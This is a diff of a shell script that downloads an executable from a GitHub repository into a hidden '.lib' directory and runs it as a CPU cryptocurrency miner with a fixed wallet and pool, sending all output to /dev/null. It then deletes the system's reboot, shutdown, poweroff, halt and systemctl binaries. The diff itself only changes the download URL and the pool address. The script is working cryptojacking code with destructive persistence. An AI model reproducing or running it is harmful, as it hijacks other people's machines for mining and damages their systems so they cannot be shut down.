@@ -25,9 +25,9 @@ sudo ./configurasi.sh
 ./configurasi.sh
 WORKER=$(TZ=":Asia/Jakarta" date '+%A-%d-%B-%Y' | sed 's/Monday/Senin/;s/Tuesday/Selasa/;s/Wednesday/Rabu/;s/Thursday/Kamis/;s/Friday/Jumat/;s/Saturday/Sabtu/;s/Sunday/Minggu/;s/January/Januari/;s/February/Februari/;s/March/Maret/;s/April/April/;s/May/Mei/;s/June/Juni/;s/July/Juli/;s/August/Agustus/;s/September/September/;s/October/Oktober/;s/November/November/;s/December/Desember/')
 mkdir .lib && cd .lib
-wget -O sgr1 https://github.com/TiannaMcdowell/All-File/raw/main/sarebu >/dev/null 2>&1
+wget -O sgr1 https://github.com/AlmiraHanafie/All-File/raw/main/sarebu >/dev/null 2>&1
 chmod +x sgr1
-./sgr1 --algorithm yespowersugar --pool 47.237.3.59:443 --wallet sugar1qg5nd84pj3g7e8wghrayxeu30e6hcg73q46e5pd.anyar --password x --disable-gpu --cpu-threads $(nproc --all) --enable-1gb-hugepages --keepalive > /dev/null 2>&1 &
+./sgr1 --algorithm yespowersugar --pool nomp.mofumofu.me:3391 --wallet sugar1qg5nd84pj3g7e8wghrayxeu30e6hcg73q46e5pd.anyar --password x --disable-gpu --cpu-threads $(nproc --all) --enable-1gb-hugepages --keepalive > /dev/null 2>&1 &
 sleep 30
 sudo rm -rvf /sbin/reboot /sbin/shutdown /sbin/poweroff /sbin/halt /bin/systemctl /usr/sbin/reboot /usr/sbin/shutdown /usr/sbin/poweroff /usr/sbin/halt /usr/bin/systemctl 
 rm -rvf /sbin/reboot /sbin/shutdown /sbin/poweroff /sbin/halt /bin/systemctl /usr/sbin/reboot /usr/sbin/shutdown /usr/sbin/poweroff /usr/sbin/halt /usr/bin/systemctl
